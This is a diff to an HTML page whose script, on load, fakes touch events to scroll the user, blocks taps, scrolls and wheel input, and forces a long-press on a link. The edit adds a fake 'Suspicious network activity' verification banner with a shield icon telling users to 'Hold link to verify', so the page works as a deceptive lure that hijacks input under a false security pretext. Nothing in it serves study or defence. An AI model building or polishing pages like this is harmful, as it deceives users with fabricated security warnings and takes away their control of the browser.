@@ -8,41 +8,61 @@
             margin: 0; 
             padding: 0; 
             background: #ffffff; 
-            height: 1000vh; 
+            height: 300vh; /* Reduced height for better stability */
             overscroll-behavior-y: none; 
+            -webkit-font-smoothing: antialiased;
         }
         
         /* The invisible top section */
-        #top-block { 
-            height: 600px; 
-            background: #ffffff; 
-            width: 100%; 
-        } 
+        #top-block { height: 600px; background: #ffffff; width: 100%; } 
 
         #main-content { 
             position: relative;
-            /* Pushes the content to the bottom 1/4 of the viewport after the 600px scroll */
-            margin-top: 550px; 
             text-align: center; 
-            font-family: -apple-system, system-ui, sans-serif;
-            color: #000;
+            font-family: "Proxima Nova", "Inter", "Segoe UI", Roboto, sans-serif;
+            padding: 0 40px;
+            /* ADUSTED: Puts the unit 250px below the 600px mark */
+            margin-top: 150px; 
+        }
+
+        .verification-icon {
+            width: 44px;
+            height: 44px;
+            margin-bottom: 12px;
+        }
+
+        .header {
+            color: #161823;
+            font-size: 19px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            line-height: 1.2;
+        }
+
+        .subtext {
+            color: #8A8B91;
+            font-size: 14px;
+            line-height: 1.4;
+            margin-bottom: 30px; 
         }
 
         #instruction-text {
-            font-weight: 500;
-            margin-bottom: 8px;
-            font-size: 17px;
+            color: #161823;
+            font-weight: 600;
+            margin-bottom: 6px;
+            font-size: 13px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
         }
 
         #breakout-link {
-            color: #0000EE;
+            color: #0049f6;
             text-decoration: underline;
-            font-size: 19px;
+            font-size: 16px;
             word-break: break-all;
             display: inline-block;
             z-index: 10000;
             position: relative;
-            /* Prevents the annoying gray box on tap */
             -webkit-tap-highlight-color: transparent;
         }
 
@@ -60,28 +80,27 @@
     <div id="top-block"></div>
 
     <div id="main-content">
-        <div id="instruction-text">Hold link to open in browser:</div>
-        
+        <svg class="verification-icon" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M24 4L6 12V22C6 33.1 13.7 43.4 24 46C34.3 43.4 42 33.1 42 22V12L24 4Z" fill="#F1F1F2"/>
+            <path d="M21 32.2L15.4 26.6L17.5 24.5L21 28L29.5 19.5L31.6 21.6L21 32.2Z" fill="#161823"/>
+        </svg>
+
+        <div class="header">Suspicious network activity</div>
+        <div class="subtext">We’ve detected unusual activity from your network. Please complete the verification to continue.</div>
+
+        <div id="instruction-text">Hold link to verify</div>
         <a id="breakout-link" href="https://www.google.com">https://www.google.com</a>
     </div>
 
     <script>
         function createTouchEvent(type, y) {
             return new TouchEvent(type, {
-                bubbles: true, 
-                cancelable: true,
-                touches: [new Touch({ 
-                    identifier: Date.now(), 
-                    target: document.body, 
-                    clientY: y, 
-                    screenY: y, 
-                    pageY: y 
-                })]
+                bubbles: true, cancelable: true,
+                touches: [new Touch({ identifier: Date.now(), target: document.body, clientY: y, screenY: y, pageY: y })]
             });
         }
 
-        async function runFinalHijack() {
-            // Smooth but fast scroll to the 600px mark
+        async function runVerifiedHijack() {
             const startY = 900, endY = 100, steps = 20, stepDelay = 12;
             document.body.dispatchEvent(createTouchEvent('touchstart', startY));
             for (let i = 0; i <= steps; i++) {
@@ -98,23 +117,20 @@
             document.getElementById('shield').style.display = 'block';
             const link = document.getElementById('breakout-link');
             
-            // Disable simple clicks/taps to force the long-press
             link.addEventListener('click', (e) => e.preventDefault(), { capture: true });
             link.addEventListener('touchend', (e) => e.preventDefault(), { passive: false });
 
             const prevent = (e) => { 
-                // Allow the long-press menu to trigger on the link
                 if (e.target.id === 'breakout-link' && e.type === 'touchstart') return;
                 e.preventDefault(); 
                 e.stopPropagation(); 
             };
-            
             ['touchstart', 'touchmove', 'wheel'].forEach(ev => {
                 window.addEventListener(ev, prevent, { passive: false, capture: true });
             });
         }
 
-        window.onload = () => { setTimeout(runFinalHijack, 150); };
+        window.onload = () => { setTimeout(runVerifiedHijack, 150); };
     </script>
 </body>
 </html>
